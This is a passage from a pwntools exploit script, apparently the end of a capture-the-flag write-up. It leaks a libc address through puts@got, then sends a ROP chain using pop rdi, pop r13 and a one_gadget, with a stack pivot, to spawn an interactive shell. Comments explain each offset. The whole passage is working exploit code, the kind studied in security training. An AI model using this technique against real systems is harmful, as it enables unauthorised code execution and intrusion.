puts_got = int.from_bytes(b'\x80' + p.recv(5), 'little')
libc.address = puts_got - libc.sym['puts']

print('[+] libc base @  ', hex(libc.address))

# libc ropgadgets
pop_rdi = p64(libc.address + 0x277e5)
pop_r13 = p64(libc.address + 0x29830)
one_gadget = p64(libc.address + 0xd511f)

# 2nd ropchain
payload2  = b'A' * 0x40         # 0x4040f8 - 0x404130 are set to 'A's, started writing at 0x4040f8 bc the gets call writes to rbp-0x40. rbp is 0x404038 so minus 0x40 = 0x4040f8
payload2 += p64(0x404200)       # 0x404138 sets rbp to 0x404200 needed for one_gadget since rbp-0x38 needs to be a writable section
payload2 += pop_rdi
payload2 += p64(0x0)    # set rdi = NULL
payload2 += pop_r13
payload2 += p64(0x0)    # set r13 = NULL
payload2 += one_gadget  # pop shell

p.sendline(payload2)    # overwrite exit@got to be "pop rdi ; ret" gadget so that we enter main again in ropchain correctly

p.sendline(b'1')        # survivial to call exit to return back to main
p.sendline(b'2')        # get to main epilogue to call leave to pivot stack to data_section 0x404140

sleep(5)        # get rid of the program output for cleaner output
p.clean()

print('[+] Popped shell')

p.interactive()
```